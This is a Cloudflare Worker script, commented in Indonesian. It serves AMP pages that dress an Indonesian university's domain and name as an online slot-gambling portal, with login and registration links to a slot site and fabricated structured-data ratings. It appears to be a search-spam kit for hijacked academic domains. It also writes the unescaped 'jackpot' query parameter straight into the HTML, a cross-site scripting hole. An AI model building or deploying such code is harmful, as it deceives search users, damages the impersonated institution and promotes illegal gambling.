// Cloudflare Worker Lengkap untuk AMP dengan Parameter Jackpot
// Dibuat untuk menangani parameter /?jackpot= dan mengubah konten AMP

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

/**
 * Memproses ekspresi PHP echo sederhana dalam HTML
 * @param {string} html - Konten HTML dengan ekspresi PHP
 * @param {object} variables - Objek berisi variabel untuk substitusi
 * @returns {string} - HTML yang sudah diproses
 */
function processPHPExpressions(html, variables) {
  // Proses <?php echo strtolower($BRANDS); ?>
  const lowerCaseRegex = /<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>/g;
  html = html.replace(lowerCaseRegex, variables.BRANDS.toLowerCase());
  
  // Proses <?php echo $BRANDS; ?>
  const echoRegex = /<\?php\s+echo\s+\$BRANDS;\s*\?>/g;
  html = html.replace(echoRegex, variables.BRANDS);
  
  // Proses class="<?php echo strtolower($BRANDS); ?>"
  const classRegex = /class="<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(classRegex, `class="${variables.BRANDS.toLowerCase()}"`);
  
  // Proses href="https://itkessu.ac.id/app/?jackpot=<?php echo strtolower($BRANDS); ?>"
  const hrefRegex = /(href="https:\/\/itkessu\.ac\.id\/app\/\?jackpot=)<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(hrefRegex, `$1${variables.BRANDS.toLowerCase()}"`);
  
  // Proses title="<?php echo strtolower($BRANDS); ?>"
  const titleRegex = /title="<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(titleRegex, `title="${variables.BRANDS.toLowerCase()}"`);
  
  // Proses alt="<?php echo strtolower($BRANDS); ?>"
  const altRegex = /alt="<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(altRegex, `alt="${variables.BRANDS.toLowerCase()}"`);
  
  // Proses JSON dalam script type="application/ld+json"
  const jsonRegex = /"name":\s*"<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(jsonRegex, `"name": "${variables.BRANDS.toLowerCase()}"`);
  
  const jsonUrlRegex = /"url":\s*"https:\/\/itkessu\.ac\.id\/app\/\?jackpot=<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"/g;
  html = html.replace(jsonUrlRegex, `"url": "https://itkessu.ac.id/app/?jackpot=${variables.BRANDS.toLowerCase()}"`);
  
  const jsonDescRegex = /"description":\s*"<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>\s*adalah/g;
  html = html.replace(jsonDescRegex, `"description": "${variables.BRANDS.toLowerCase()} adalah`);
  
  const jsonAuthorRegex = /"name":\s*"<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>"\s*}/g;
  html = html.replace(jsonAuthorRegex, `"name": "${variables.BRANDS.toLowerCase()}"}`);
  
  const jsonPublisherRegex = /"name":\s*"<\?php\s+echo\s+strtolower\(\$BRANDS\);\s*\?>",\s*"logo"/g;
  html = html.replace(jsonPublisherRegex, `"name": "${variables.BRANDS.toLowerCase()}", "logo"`);
  
  return html;
}

/**
 * Menyimpan informasi ke KV (opsional) untuk analitik
 * @param {string} key - Kunci untuk menyimpan data
 * @param {string} value - Nilai untuk disimpan
 */
async function logToKV(key, value) {
  try {
    // Uncomment jika menggunakan Cloudflare KV
    // await ANALYTICS.put(key, value, {expirationTtl: 86400}) // 24 jam
    console.log(`Logging to KV: ${key} = ${value}`)
  } catch (error) {
    console.error(`Error logging to KV: ${error.message}`)
  }
}

/**
 * Menangani permintaan utama
 * @param {Request} request
 */
async function handleRequest(request) {
  const url = new URL(request.url)
  const jackpotParam = url.searchParams.get('jackpot')
  
  // Tentukan header CORS yang diperlukan untuk AMP
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'AMP-Access-Control-Allow-Source-Origin': url.origin,
    'Access-Control-Expose-Headers': 'AMP-Access-Control-Allow-Source-Origin'
  }
  
  // Tangani permintaan OPTIONS untuk CORS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: corsHeaders
    })
  }
  
  // Jika tidak ada parameter jackpot, redirect ke halaman default atau berikan pesan error
  if (!jackpotParam) {
    return new Response('Parameter ?jackpot= diperlukan untuk mengakses halaman ini', {
      status: 400,
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8',
        ...corsHeaders
      }
    })
  }

  // Log akses untuk analitik (opsional)
  const timestamp = new Date().toISOString()
  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown'
  const userAgent = request.headers.get('User-Agent') || 'unknown'
  
  await logToKV(`access:${timestamp}:${jackpotParam}`, JSON.stringify({
    param: jackpotParam,
    timestamp,
    ip: clientIP,
    ua: userAgent,
    referer: request.headers.get('Referer') || 'direct'
  }))

  try {
    // URL file target.txt
    // PENTING: Ganti dengan URL yang sebenarnya dari file target.txt Anda
    const targetUrl = 'https://example.com/target.txt'
    
    // Ambil konten template dari target.txt atau gunakan konten default
    let templateContent
    
    try {
      // Coba ambil dari URL target
      const targetResponse = await fetch(targetUrl, {
        cf: {
          cacheTtl: 3600, // Cache 1 jam di Cloudflare
          cacheEverything: true
        }
      })
      
      if (!targetResponse.ok) {
        throw new Error(`Gagal mengambil target.txt: ${targetResponse.status}`)
      }
      
      templateContent = await targetResponse.text()
    } catch (fetchError) {
      console.error('Gagal mengambil target.txt:', fetchError)
      
      // Gunakan template default dari kode yang diunggah sebagai fallback
      // Ini sama dengan isi paste.txt yang diberikan
      templateContent = `<!DOCTYPE html>
<html amp lang="en-ID">
      <meta charset="utf-8"/>
      <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
      <title><?php echo strtolower($BRANDS); ?>: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara</title>
      <meta name="description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
      <meta name="robots" content="index, follow"/>
      <meta name="theme-color" content="#cbd000"/> 
      <link rel="canonical" href="https://itkessu.ac.id/app/?jackpot=<?php echo strtolower($BRANDS); ?>"/>
      <link rel="icon" type="image/x-icon" media="(prefers-color-scheme: dark)" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp"/>
      <meta property="og:url" content="https://itkessu.ac.id/app/?jackpot=<?php echo strtolower($BRANDS); ?>"/>
      <meta property="og:site_name" content="<?php echo strtolower($BRANDS); ?>"/>
      <meta property="og:image:alt" content="<?php echo strtolower($BRANDS); ?>"/>
      <meta property="og:image" content="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp"/>
      <meta property="og:title" content="<?php echo strtolower($BRANDS); ?>: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara"/>
      <meta property="og:description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
      <meta property="og:locale" content="ID_id"/>
      <meta property="og:type" content="website"/>
      <meta name="twitter:card" content="summary"/>
      <meta name="twitter:title" content="<?php echo strtolower($BRANDS); ?>: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara"/>
      <meta name="twitter:description" content="Aplikasi resmi Institut Teknologi dan Kesehatan Sumatera Utara (ITKessu) menyediakan layanan akademik, administrasi, dan pembelajaran terintegrasi bagi seluruh civitas akademika. Akses mudah untuk sistem informasi mahasiswa, jadwal kuliah, perpustakaan digital, dan layanan kampus dalam satu platform."/>
      <meta name="twitter:image:src" content="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp"/>
      <link rel="shortcut icon" type="image/x-webp" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp" />
      <script type="application/ld+json">
         {
           "@context": "https://schema.org",
           "@type": "Game",
           "name": "<?php echo strtolower($BRANDS); ?>",
           "url": "https://itkessu.ac.id/app/?jackpot=<?php echo strtolower($BRANDS); ?>",
           "image": "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp",
           "description": "<?php echo strtolower($BRANDS); ?> adalah situs slot online yang gacor dan sedang viral serta menyediakan deposit situs slot dana, slot shopeepay, dan slot pulsa rekomendasi HCAH.",
           "author": {
             "@type": "Organization",
             "name": "<?php echo strtolower($BRANDS); ?>"
           },
           "publisher": {
             "@type": "Organization",
             "name": "<?php echo strtolower($BRANDS); ?>",
             "logo": {
               "@type": "ImageObject",
               "url": "https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/icon-slotgacor.webp"
             }
           },
           "genre": "Game Online",
           "operatingSystem": "All",
           "applicationCategory": "Game",
           "aggregateRating": {
             "@type": "AggregateRating",
             "ratingValue": "4.6",
             "ratingCount": "215"
           }
         }
      </script>
      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap"/>
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet"/>
      <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/slotdemo.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/wezhdtvga0u3bifplimc.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/slotdemo.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/cfwbsx4hcpoyshpovyth.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/r1j4iwins1pnf551a1xe.webp"/>
      <link rel="preload" as="image" href="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/tvl3xe4sozct26i4gzcc.webp"/>
      <script async src="https://cdn.ampproject.org/v0.js"></script>
      <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><style amp-custom>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Orbitron,sans-serif;background:#99212d;color:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;padding:20px;flex-direction:column}.container{width:100%;max-width:1024px;display:flex;flex-direction:column;align-items:center;position:relative;perspective:1000px;transform-style:preserve-3d}.cube{position:relative;width:300px;height:300px;transform-style:preserve-3d;transform:rotateX(30deg) rotateY(30deg);animation:spin 20s infinite linear;margin-top:20px}.cube div{position:absolute;width:100%;height:100%;background:#1f1f1f;border:2px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:20px;opacity:.9}.cube .front{transform:translateZ(150px)}.cube .back{transform:rotateY(180deg) translateZ(150px)}.cube .left{transform:rotateY(-90deg) translateZ(150px)}.cube .right{transform:rotateY(90deg) translateZ(150px)}.cube .top{transform:rotateX(90deg) translateZ(150px)}.cube .bottom{transform:rotateX(-90deg) translateZ(150px)}.cube amp-img{width:100%;height:100%;object-fit:cover}.static-logo{width:100px;height:100px;margin-bottom:-50px}@keyframes spin{from{transform:rotateX(30deg) rotateY(30deg)}to{transform:rotateX(30deg) rotateY(390deg)}}.cta{margin-top:40px;font-size:18px;color:#ff4081;text-align:center;animation:text-pulse 2s infinite}@keyframes text-pulse{0%,100%{opacity:1}50%{opacity:.5}}.cta a{display:inline-block;padding:12px 24px;margin:10px 5px;background:#000000;color:#99212d;text-decoration:none;border-radius:5px;transition:background .3s ease}.cta a:hover{background:#ff6363}@media (max-width:600px){.cube{width:200px;height:200px}.static-logo{width:240px;height:60px;margin-bottom:100px}.cta{font-size:16px;margin-top:80px}}.h1{margin-top:20px;font-size:medium;color:#000000}.footer{font-size:small;text-align:center}.copyright{color:#000000}</style>
   <body>
      <amp-img class="static-logo" src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/tvl3xe4sozct26i4gzcc.webp" width="150" height="150" layout="intrinsic" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
      <div class="container">
         <div class="cube">
            <div class="front">
               <amp-img src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/slotdemo.webp" width="400" height="400" layout="responsive" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
            </div>
            <div class="back">
               <amp-img src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/wezhdtvga0u3bifplimc.webp" width="400" height="400" layout="responsive" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
            </div>
            <div class="left">
               <amp-img src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/tvl3xe4sozct26i4gzcc.webp" width="400" height="400" layout="responsive" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
            </div>
            <div class="right">
               <amp-img src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409494/h2hmrj6zl8ocojfa3d78.webp" width="400" height="400" layout="responsive" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
            </div>
            <div class="bottom">
               <amp-img src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/cfwbsx4hcpoyshpovyth.webp" width="400" height="400" layout="responsive" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
            </div>
            <amp-img class="logo" src="https://res.cloudinary.com/doq0uyg5g/image/upload/v1745409495/r1j4iwins1pnf551a1xe.webp" width="150" height="150" layout="intrinsic" alt="<?php echo strtolower($BRANDS); ?>"></amp-img>
         </div>
         <div class="cta">
            <h1 class="h1"><?php echo strtolower($BRANDS); ?>: Portal Layanan Terpadu Institut Teknologi dan Kesehatan Sumatera Utara</h1>
            <a href="https://slot603gacor.xyz/blackwidow" target="_blank" rel="nofollow noreferrer noopener">LOGIN</a>
            <a href="https://slot603gacor.xyz/blackwidow" target="_blank" rel="nofollow noreferrer noopener">DAFTAR</a>
            <a href="https://slot603gacor.xyz/blackwidow" target="_blank" rel="nofollow noreferrer noopener">LIVE CHAT</a>
         </div>
         <br>
      </div>
      <footer class="footer">COPYRIGHT - <a class="<?php echo strtolower($BRANDS); ?>" href="https://itkessu.ac.id/app/?jackpot=<?php echo strtolower($BRANDS); ?>" title="<?php echo strtolower($BRANDS); ?>"><?php echo strtolower($BRANDS); ?></a> OFFICIAL</footer>
   </body>
</html>`
    }
    
    // Proses template dan ganti semua variabel PHP dengan nilai parameter jackpot
    const processedContent = processPHPExpressions(templateContent, {
      BRANDS: jackpotParam
    })
    
    // Tentukan header untuk respons
    const contentTypeHeaders = {
      'Content-Type': 'text/html;charset=UTF-8',
      'Cache-Control': 'public, max-age=300', // 5 menit cache
      ...corsHeaders
    }
    
    // Kembalikan halaman AMP yang sudah diproses
    return new Response(processedContent, {
      status: 200,
      headers: contentTypeHeaders
    })
    
  } catch (error) {
    console.error('Terjadi kesalahan:', error)
    
    // Log error untuk debugging
    await logToKV(`error:${new Date().toISOString()}`, 
      JSON.stringify({
        param: jackpotParam,
        error: error.message,
        stack: error.stack
      })
    )
    
    // Kembalikan respons error
    return new Response(`Terjadi kesalahan dalam memproses permintaan. Silakan coba lagi nanti.`, {
      status: 500,
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8',
        ...corsHeaders
      }
    })
  }
}
